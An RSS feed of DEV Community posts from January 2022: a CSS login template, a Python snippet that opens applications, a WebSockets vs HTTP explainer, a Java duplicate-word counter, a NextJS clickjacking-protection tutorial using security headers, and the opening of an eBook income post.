<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>How to make stylish login page with CSS only.</title>
      <author>frontend</author>
      <pubDate>Sat, 22 Jan 2022 13:56:42 +0000</pubDate>
      <link>https://dev.to/frontendcodes/how-to-make-stylish-login-page-with-css-only-7dm</link>
      <guid>https://dev.to/frontendcodes/how-to-make-stylish-login-page-with-css-only-7dm</guid>
      <description>&lt;p&gt;I made the login page design with animation on one page. You can use the login page design for free in your projects. All I want from you is to comment. For more Free templates you can check &lt;a href="https://www.front-end.codes/"&gt;front-end.codes&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OPHMKilx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9lurio3ylkqvfme4qzll.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OPHMKilx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9lurio3ylkqvfme4qzll.gif" alt="Image description" width="880" height="495"&gt;&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;div id="container"&amp;gt;
  &amp;lt;div id="left"&amp;gt;
    &amp;lt;h1 id="welcome"&amp;gt;Welcome&amp;lt;/h1&amp;gt;
    &amp;lt;p id="lorem"&amp;gt;
      Lorem ipsum dolor sit amet, consectetur adipiscing elit.&amp;lt;br&amp;gt;
      Vivamus sodales eros non arcu pellentesque convallis.&amp;lt;br&amp;gt;
      Nunc dignissim lectus in malesuada porta.&amp;lt;br&amp;gt;
      Proin ac erat sed urna congue suscipit.&amp;lt;br&amp;gt;
      Morbi aliquet eget nisl id ornare.
    &amp;lt;/p&amp;gt;
  &amp;lt;/div&amp;gt;
  &amp;lt;div id="right"&amp;gt;
    &amp;lt;h1 id="login"&amp;gt;LogIn&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;input type="email" id="email" class="client-info"&amp;gt;
    &amp;lt;label for="email"&amp;gt;Email&amp;lt;/label&amp;gt;
    &amp;lt;input type="password" id="password" class="client-info"&amp;gt;
    &amp;lt;label for="password"&amp;gt;Password&amp;lt;/label&amp;gt;
    &amp;lt;input type="submit" id="submit" class="client-info" value="Submit"&amp;gt;
    &amp;lt;button class="social" id="facebook"&amp;gt;connect with facebook&amp;lt;/button&amp;gt;
    &amp;lt;button class="social" id="google"&amp;gt;connect with google&amp;lt;/button&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and add some CSS.For more than &lt;a href="https://front-end.codes/bootstrap-login-form-cards/"&gt;40 CSS &amp;amp; Bootstrap login template&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;* {
  margin: 0;
  padding: 0;
  outline: none;
}

:root {
  --main-color: #fff;
  --second-color: #347deb;
  --box-shadow: 0 10px 10px rgba(0, 0, 0, 0.1);
  --facebook-color: rgb(60, 90, 154);
  --google-color: rgb(220, 74, 61);
}

html {
  height: 100%;
}
body {
  background-image: linear-gradient(310deg, #df98fa, #9055ff);
  font-family: sans-serif;
}

#container {
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  background-color: var(--main-color);
  width: 1200px;
  height: 800px;
  border-radius: 10px;
  display: grid;
  grid-template-columns: repeat(2, 50%);
  box-shadow: var(--box-shadow);
  transition-duration: 1s;
}

#left, #right {
  margin: auto;
  width: 95%;
  height: 96%;
  border-radius: 10px;
}

#left {
  background-image: url("https://images.unsplash.com/photo-1615400014497-55726234cccb?crop=entropy&amp;amp;cs=srgb&amp;amp;fm=jpg&amp;amp;ixid=MnwxNDU4OXwwfDF8cmFuZG9tfHx8fHx8fHx8MTYxNzg4Njg0Ng&amp;amp;ixlib=rb-1.2.1&amp;amp;q=85");
  background-size: cover;
  background-position: center;
  box-shadow: var(--box-shadow);
}
#welcome, #lorem {
  margin: 20px;
  text-shadow: var(--box-shadow);
}
#welcome {
  font-size: 75px;
  font-weight: 300;
  margin-top: 330px;
  text-shadow: var(--box-shadow);
}

#login {
  padding-top: 35%;
  text-align: center;
  text-transform: uppercase;
  font-weight: 100;
  text-shadow: var(--box-shadow);
}
.client-info {
  display: block;
  margin: 20px auto;
  width: 60%;
  height: 50px;
  border: solid #999 1px;
  border-radius: 5px;
  text-indent: 15px;
  transition: all 200ms;
  box-shadow: var(--box-shadow);
}
.client-info:focus {
  width: 80%;
}
label {
  position: absolute;
  margin: -76px 130px;
    font-size: 12px;
    white-space: nowrap;
    background: #fff;
    padding: 0 5px;
    color: #999;
  transition: all 200ms;
  text-shadow: var(--box-shadow);
}
#email:focus ~ label[for="email"] {
  margin: -76px 70px;
}
#password:focus ~ label[for="password"] {
  margin: -76px 70px;
}
#submit {
  border: none;
  background-color: #9055ff;
  color: white;
  width: 60%;
}
#submit:hover {
  background-color: #df98fa;
}

.social {
  background-color: #fff;
  display: block;
  margin: 10px auto;
  width: 70%;
  height: 50px;
  border: none;
  border-radius: 5px;
  text-transform: uppercase;
  transition-duration: 200ms;
  box-shadow: var(--box-shadow);
  text-shadow: var(--box-shadow);
}
#facebook {
  border: solid var(--facebook-color) 1px;
  color: var(--facebook-color);
}
#facebook:hover {
  background-color: var(--facebook-color);
  color: white;
}
#google {
  border: solid var(--google-color) 1px;
  color: var(--google-color);
}
#google:hover {
  background-color: var(--google-color);
  color: white;
}

@media (max-width: 1250px) {

  #container {
    width: 600px;
    display: block;
  }
  #left {
    display: none;
  }
  #right {
    margin-top: 16px;
    background-image: url("https://images.unsplash.com/photo-1615400014497-55726234cccb?crop=entropy&amp;amp;cs=srgb&amp;amp;fm=jpg&amp;amp;ixid=MnwxNDU4OXwwfDF8cmFuZG9tfHx8fHx8fHx8MTYxNzg4Njg0Ng&amp;amp;ixlib=rb-1.2.1&amp;amp;q=85");
    background-size: cover;
    background-position: center;
    box-shadow: var(--box-shadow);
  }

}

@media (max-height: 850px) {

  #container {
    width: 1000px;
    height: 600px;
  }
  #login {
    padding-top: 20%;
  }
  #welcome {
    margin-top: 240px;
    font-size: 60px;
  }
  #lorem {
    font-size: 15px;
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>css</category>
      <category>tutorial</category>
      <category>opensource</category>
    </item>
    <item>
      <title>How to make stylish login page with CSS only.</title>
      <author>frontend</author>
      <pubDate>Sat, 22 Jan 2022 13:30:22 +0000</pubDate>
      <link>https://dev.to/frontendcodes/how-to-make-login-stilish-login-page-with-css-only-2kgc</link>
      <guid>https://dev.to/frontendcodes/how-to-make-login-stilish-login-page-with-css-only-2kgc</guid>
      <description>&lt;p&gt;I made the login page design with animation on one page. You can use the login page design for free in your projects. All I want from you is to comment. For more Free templates you can check &lt;a href="https://www.front-end.codes/"&gt;front-end.codes&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--carJH6ci--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6ol3fgxr5z3zehjpzm4z.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--carJH6ci--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6ol3fgxr5z3zehjpzm4z.gif" alt="Image description" width="880" height="495"&gt;&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;div id="container"&amp;gt;
  &amp;lt;div id="left"&amp;gt;
    &amp;lt;h1 id="welcome"&amp;gt;Welcome&amp;lt;/h1&amp;gt;
    &amp;lt;p id="lorem"&amp;gt;
      Lorem ipsum dolor sit amet, consectetur adipiscing elit.&amp;lt;br&amp;gt;
      Vivamus sodales eros non arcu pellentesque convallis.&amp;lt;br&amp;gt;
      Nunc dignissim lectus in malesuada porta.&amp;lt;br&amp;gt;
      Proin ac erat sed urna congue suscipit.&amp;lt;br&amp;gt;
      Morbi aliquet eget nisl id ornare.
    &amp;lt;/p&amp;gt;
  &amp;lt;/div&amp;gt;
  &amp;lt;div id="right"&amp;gt;
    &amp;lt;h1 id="login"&amp;gt;LogIn&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;input type="email" id="email" class="client-info"&amp;gt;
    &amp;lt;label for="email"&amp;gt;Email&amp;lt;/label&amp;gt;
    &amp;lt;input type="password" id="password" class="client-info"&amp;gt;
    &amp;lt;label for="password"&amp;gt;Password&amp;lt;/label&amp;gt;
    &amp;lt;input type="submit" id="submit" class="client-info" value="Submit"&amp;gt;
    &amp;lt;button class="social" id="facebook"&amp;gt;connect with facebook&amp;lt;/button&amp;gt;
    &amp;lt;button class="social" id="google"&amp;gt;connect with google&amp;lt;/button&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and add some CSS.For more than &lt;a href="https://front-end.codes/bootstrap-login-form-cards/"&gt;40 CSS &amp;amp; Bootstrap login template&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;* {
  margin: 0;
  padding: 0;
  outline: none;
}

:root {
  --main-color: #fff;
  --second-color: #347deb;
  --box-shadow: 0 10px 10px rgba(0, 0, 0, 0.1);
  --facebook-color: rgb(60, 90, 154);
  --google-color: rgb(220, 74, 61);
}

html {
  height: 100%;
}
body {
  background-image: linear-gradient(310deg, #df98fa, #9055ff);
  font-family: sans-serif;
}

#container {
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  background-color: var(--main-color);
  width: 1200px;
  height: 800px;
  border-radius: 10px;
  display: grid;
  grid-template-columns: repeat(2, 50%);
  box-shadow: var(--box-shadow);
  transition-duration: 1s;
}

#left, #right {
  margin: auto;
  width: 95%;
  height: 96%;
  border-radius: 10px;
}

#left {
  background-image: url("https://images.unsplash.com/photo-1615400014497-55726234cccb?crop=entropy&amp;amp;cs=srgb&amp;amp;fm=jpg&amp;amp;ixid=MnwxNDU4OXwwfDF8cmFuZG9tfHx8fHx8fHx8MTYxNzg4Njg0Ng&amp;amp;ixlib=rb-1.2.1&amp;amp;q=85");
  background-size: cover;
  background-position: center;
  box-shadow: var(--box-shadow);
}
#welcome, #lorem {
  margin: 20px;
  text-shadow: var(--box-shadow);
}
#welcome {
  font-size: 75px;
  font-weight: 300;
  margin-top: 330px;
  text-shadow: var(--box-shadow);
}

#login {
  padding-top: 35%;
  text-align: center;
  text-transform: uppercase;
  font-weight: 100;
  text-shadow: var(--box-shadow);
}
.client-info {
  display: block;
  margin: 20px auto;
  width: 60%;
  height: 50px;
  border: solid #999 1px;
  border-radius: 5px;
  text-indent: 15px;
  transition: all 200ms;
  box-shadow: var(--box-shadow);
}
.client-info:focus {
  width: 80%;
}
label {
  position: absolute;
  margin: -76px 130px;
    font-size: 12px;
    white-space: nowrap;
    background: #fff;
    padding: 0 5px;
    color: #999;
  transition: all 200ms;
  text-shadow: var(--box-shadow);
}
#email:focus ~ label[for="email"] {
  margin: -76px 70px;
}
#password:focus ~ label[for="password"] {
  margin: -76px 70px;
}
#submit {
  border: none;
  background-color: #9055ff;
  color: white;
  width: 60%;
}
#submit:hover {
  background-color: #df98fa;
}

.social {
  background-color: #fff;
  display: block;
  margin: 10px auto;
  width: 70%;
  height: 50px;
  border: none;
  border-radius: 5px;
  text-transform: uppercase;
  transition-duration: 200ms;
  box-shadow: var(--box-shadow);
  text-shadow: var(--box-shadow);
}
#facebook {
  border: solid var(--facebook-color) 1px;
  color: var(--facebook-color);
}
#facebook:hover {
  background-color: var(--facebook-color);
  color: white;
}
#google {
  border: solid var(--google-color) 1px;
  color: var(--google-color);
}
#google:hover {
  background-color: var(--google-color);
  color: white;
}

@media (max-width: 1250px) {

  #container {
    width: 600px;
    display: block;
  }
  #left {
    display: none;
  }
  #right {
    margin-top: 16px;
    background-image: url("https://images.unsplash.com/photo-1615400014497-55726234cccb?crop=entropy&amp;amp;cs=srgb&amp;amp;fm=jpg&amp;amp;ixid=MnwxNDU4OXwwfDF8cmFuZG9tfHx8fHx8fHx8MTYxNzg4Njg0Ng&amp;amp;ixlib=rb-1.2.1&amp;amp;q=85");
    background-size: cover;
    background-position: center;
    box-shadow: var(--box-shadow);
  }

}

@media (max-height: 850px) {

  #container {
    width: 1000px;
    height: 600px;
  }
  #login {
    padding-top: 20%;
  }
  #welcome {
    margin-top: 240px;
    font-size: 60px;
  }
  #lorem {
    font-size: 15px;
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
    </item>
    <item>
      <title>Open Any application from your laptop using Python</title>
      <author>Suresh Ayyanna</author>
      <pubDate>Sat, 22 Jan 2022 12:31:09 +0000</pubDate>
      <link>https://dev.to/sureshayyanna/open-any-application-from-your-laptop-using-python-4eeg</link>
      <guid>https://dev.to/sureshayyanna/open-any-application-from-your-laptop-using-python-4eeg</guid>
      <description>&lt;p&gt;Step 1: Install python IDLE&lt;br&gt;
Step 2: type below commands&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Import subprocess&lt;/li&gt;
&lt;li&gt;subprocess.call(AppPath//AppName.exe)
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Python 3.9.1 (tags/v3.9.1:1e5d33e, Dec  7 2020, 17:08:21)
 [MSC v.1927 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license()" 
for more information.

&amp;gt;&amp;gt;&amp;gt; import subprocess
&amp;gt;&amp;gt;&amp;gt; subprocess.call('cmd.exe')
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;Eg 1: Open Mozilla from your laptop&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;subprocess.call(['C:\Program Files\Mozilla Firefox\\firefox.exe'])
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
    </item>
    <item>
      <title>Web Sockets v/s HTTPS</title>
      <author>Suresh Ayyanna</author>
      <pubDate>Sat, 22 Jan 2022 12:17:05 +0000</pubDate>
      <link>https://dev.to/sureshayyanna/web-sockets-vs-https-297b</link>
      <guid>https://dev.to/sureshayyanna/web-sockets-vs-https-297b</guid>
      <description>&lt;p&gt;HTTP and Web Socket both are communication protocols used in client-server communication. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#httphttps"&gt;
  &lt;/a&gt;
  HTTP/HTTPS:
&lt;/h2&gt;

&lt;p&gt;HTTP is essentially a request/response protocol in the client-server computing model, and the primary communication mode of the World Wide Web.&lt;br&gt;
       The HTTP protocol is unidirectional protocol works on the top of TCP protocol which is a connection-oriented transport layer protocol, we can create the connection by using HTTP request methods after getting the response HTTP connection get closed.&lt;br&gt;
      When we do not want to retain a connection for a particular amount of time or reusing the single connection for transmitting the data, HTTP connection is slower than the WebSocket..&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_BbpPgUi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xrlraklaaa1k85bp3war.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_BbpPgUi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xrlraklaaa1k85bp3war.png" alt="HTTP" width="594" height="529"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#websocket"&gt;
  &lt;/a&gt;
  WebSocket:
&lt;/h2&gt;

&lt;p&gt;WebSocket is a bidirectional communication protocol that can send the data from the client to the server or from the server to the client by reusing the established connection channel. The connection is kept alive until terminated by either the client or the server.&lt;br&gt;
One notable advantage of using WebSockets is, almost every browser supports WebSockets.&lt;br&gt;
Almost all the real-time application like (trading, monitoring, notification) services uses WebSocket to receiving the data on a single communication channel.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bi-Directional protocol&lt;/li&gt;
&lt;li&gt;Full Duplex communication&lt;/li&gt;
&lt;li&gt;Single TCP connection&lt;/li&gt;
&lt;li&gt;Good security model&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All the frequently updated applications used WebSocket because it is faster than HTTP Connection.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Uzj2_uZO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/639h2nnangd7fnc8vzeb.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Uzj2_uZO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/639h2nnangd7fnc8vzeb.png" alt="WebSockert" width="608" height="530"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion:
&lt;/h2&gt;

&lt;p&gt;WebSockets will be the better choice in the context of realtime`, ongoing communication.&lt;br&gt;
      WebSocket uses HTTP as the initial transport mechanism, but keeps the TCP connection alive after the HTTP response is received so that it can be used for sending messages between client and server.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--k0P6THCU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cgvskd8ew9hd1kewi4pt.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k0P6THCU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cgvskd8ew9hd1kewi4pt.png" alt="Image description" width="697" height="506"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>webcomponents</category>
      <category>programming</category>
      <category>java</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Find Duplicate String and Letters from a Given string - Java(Collections)</title>
      <author>Suresh Ayyanna</author>
      <pubDate>Sat, 22 Jan 2022 11:34:31 +0000</pubDate>
      <link>https://dev.to/sureshayyanna/find-duplicate-string-and-letters-from-a-given-string-javacollections-4poe</link>
      <guid>https://dev.to/sureshayyanna/find-duplicate-string-and-letters-from-a-given-string-javacollections-4poe</guid>
      <description>&lt;p&gt;**&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#program-to-find-duplicate-string-and-letters-from-a-given-string-javacollections"&gt;
  &lt;/a&gt;
  Program to find Duplicate String and Letters from a Given string - Java(Collections)
&lt;/h2&gt;

&lt;p&gt;**&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package Test;

import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import java.util.Set;

public class Program1 {

    public static void findDuplicateWords(String str) {
        // 1. Split the String - String Array formation
        String[] s = str.split(" ");

        // 2. Crate a HashMap to get key-value pair
        HashMap&amp;lt;String, Integer&amp;gt; map = new HashMap&amp;lt;String, Integer&amp;gt;();
        for (String temp : s) {
            if (map.get(temp) != null) {
                map.put(temp, map.get(temp) + 1);
            } else
                map.put(temp, 1);
        }

        // 3. To find duplicate words from keyValue set
        Set&amp;lt;Map.Entry&amp;lt;String, Integer&amp;gt;&amp;gt; data = map.entrySet();
        for (Map.Entry&amp;lt;String, Integer&amp;gt; dup : data) {
            if (dup.getValue() &amp;gt; 1)
                System.out.println("The word : '" + dup.getKey() + "' appeared - " + dup.getValue() + " times");

        }
    }

    public static void findDuplicateLetters(String str) {
        //1.Remove whitespaces
        str = str.replace(" ", "");

        //2.Convert to Lower case all letters
        str=str.toLowerCase();

        //3. create Hash map to get key-value pair
        HashMap&amp;lt;Character, Integer&amp;gt; hmap = new HashMap&amp;lt;&amp;gt;();

        for (int i = 0; i &amp;lt; str.length(); i++) {
            char ch = str.charAt(i);
            if (hmap.get(ch) != null) {
                hmap.put(ch, hmap.get(ch) + 1);
            } else
                hmap.put(ch, 1);
        }
        Set&amp;lt;Map.Entry&amp;lt;Character, Integer&amp;gt;&amp;gt; data = hmap.entrySet();
        for (Map.Entry&amp;lt;Character, Integer&amp;gt; dup : data) {
            if (dup.getValue() &amp;gt; 1)
                System.out.println("The word : '" + dup.getKey() + "' appeared - " + dup.getValue() + " times");
        }
    }

    public static void main(String[] args) {
        Scanner input = new Scanner(System.in);
        System.out.println("Enter the Stirng");

        String str = input.nextLine();

        findDuplicateWords(str);
        findDuplicateLetters(str);

    }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>java</category>
      <category>testing</category>
      <category>javainterviewquestion</category>
      <category>programming</category>
    </item>
    <item>
      <title>How to Protect Your NextJS Website from Clickjacking?</title>
      <author>Keshav Malik</author>
      <pubDate>Sat, 22 Jan 2022 11:28:03 +0000</pubDate>
      <link>https://dev.to/theinfosecguy/how-to-protect-your-nextjs-website-from-clickjacking-2jbg</link>
      <guid>https://dev.to/theinfosecguy/how-to-protect-your-nextjs-website-from-clickjacking-2jbg</guid>
      <description>&lt;p&gt;Hey Guys 👋&lt;/p&gt;

&lt;p&gt;In this blog, I will be discussing how to protect the NextJS website from Clickjacking vulnerability using &lt;code&gt;X-Frame-Options&lt;/code&gt; or &lt;code&gt;Content-Security-Policy&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h2&gt;

&lt;p&gt;Clickjacking is one of the most common vulnerabilities, which occurs when a web browser allows HTML content from one domain, to be displayed inside a framed page from another domain. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Clickjacking&lt;/strong&gt; attacks trick victims into clicking buttons or links on a different site than the main webpage. This attack tricks victims into clicking on links or buttons that they didn't intend to, with the attackers' malicious links. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-clickjacking"&gt;
  &lt;/a&gt;
  What is Clickjacking?
&lt;/h2&gt;

&lt;p&gt;Clickjacking is a web security vulnerability that allows an attacker to hijack clicks meant for a victim. The attacker creates an invisible iframe and uses it to display the contents of a legitimate webpage in the background while the victim is browsing a different website.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--oSRs1dFA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/neq5aa36bbr24ehcfnpt.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--oSRs1dFA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/neq5aa36bbr24ehcfnpt.png" alt="What is Clickjacking?" width="880" height="495"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-to-prevent-clickjacking-on-nextjs-application"&gt;
  &lt;/a&gt;
  How to prevent Clickjacking on NextJS Application?
&lt;/h2&gt;

&lt;p&gt;Clickjacking can be prevented using Content Security Policy or using X-Frame-Options header. Before knowing how to fix Clickjacking, let's understand both terms in detail.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Content Security Policy (CSP)&lt;/strong&gt; is a mechanism web applications can use to mitigate a broad class of content injection vulnerabilities, such as cross-site scripting (XSS). &lt;/p&gt;

&lt;p&gt;On the other hand, the &lt;code&gt;**X-Frame-Options**&lt;/code&gt; header is an HTTP response header that instructs the browser whether the current page can be rendered in a &lt;code&gt;&amp;lt;frame&amp;gt;&lt;/code&gt; , &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; , &lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt; .&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-1-create-a-nextjs-config-file"&gt;
  &lt;/a&gt;
  Step 1 - Create a NextJS Config File
&lt;/h3&gt;

&lt;p&gt;First of all, create a new file named &lt;code&gt;next.config.js&lt;/code&gt;. In this config file, we will add our security headers.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-2-add-security-headers"&gt;
  &lt;/a&gt;
  Step 2 - Add Security Headers
&lt;/h3&gt;

&lt;p&gt;Now that we have our config file let's add &lt;code&gt;X-Frame-Options&lt;/code&gt; header details. Create a following array of objects in &lt;code&gt;next.config.js&lt;/code&gt; file.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const securityHeaders = [
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You can add CSP as well to prevent clickjacking. &lt;/p&gt;

&lt;p&gt;&lt;code&gt;Content-Security-Policy: frame-ancestors 'none';&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Feel free to change &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"&gt;value&lt;/a&gt; &lt;code&gt;SAMEORIGIN&lt;/code&gt; to &lt;code&gt;DENY&lt;/code&gt; or &lt;code&gt;ALLOW-FROM uri&lt;/code&gt; based on your needs.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-3-set-headers-to-routes"&gt;
  &lt;/a&gt;
  Step 3 - Set Headers to Routes
&lt;/h3&gt;

&lt;p&gt;After creating an array of headers, we need to apply these headers to different routes (all routes in our case). Add the following code block just below the &lt;code&gt;securityHeaders&lt;/code&gt; array.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;module.exports = {
  reactStrictMode: true,
  async headers() {
    return [
      {
        // Apply these headers to all routes in your application.
        source: '/(.*)',
        headers: securityHeaders,
      },
    ]
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#step-4-test-your-application"&gt;
  &lt;/a&gt;
  Step 4 - Test Your Application
&lt;/h3&gt;

&lt;p&gt;We have now added the &lt;code&gt;X-Frame-Options&lt;/code&gt; header to all our routes to protect our application from Clickjacking vulnerability. It's time we check if we have successfully prevented Clickjacking.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Visit &lt;a href="https://www.vulnerable.live/clickjacking"&gt;Vulnerable.Live&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Enter your domain URL and hit Enter&lt;/li&gt;
&lt;li&gt;Check if your application is vulnerable or not.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;I hope you enjoyed this article about how to protect your NextJS site from Clickjacking. With this knowledge, we know that you can make the most of your website and not worry about it being vulnerable to Clickjacking! If you have any doubt, feel free to ask in the comments section. I will be happy to answer.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>nextjs</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>I Spent 35 Hours Writing an eBook and Earned $2,723 in the First 6 Months</title>
      <author>Sunil Kumar</author>
      <pubDate>Sat, 22 Jan 2022 10:32:06 +0000</pubDate>
      <link>https://dev.to/sunilc_/i-spent-35-hours-writing-an-ebook-and-earned-2723-in-the-first-6-months-499c</link>
      <guid>https://dev.to/sunilc_/i-spent-35-hours-writing-an-ebook-and-earned-2723-in-the-first-6-months-499c</guid>
      <description>&lt;p&gt;Have you ever dreamed of making money without having to work?&lt;/p&gt;

&lt;p&gt;Selling Info products is a great way to make money passively. But it takes a lot of hard work and dedication in the beginning, but it’s totally worth it. A lot of people are doing it and you can do it too.&lt;/p&gt;

&lt;p&gt;I made $2,723 in the first 6 months after launching my first eBook: &lt;a href="https://sunilkumarc.gumroad.com/l/kgtSS"&gt;How to Start a SaaS Company: A Beginner’s Guide&lt;/a&gt;. It may not be significant money. But earning this made me realise the endless opportunities the internet provides. This is just the beginning.&lt;br&gt;
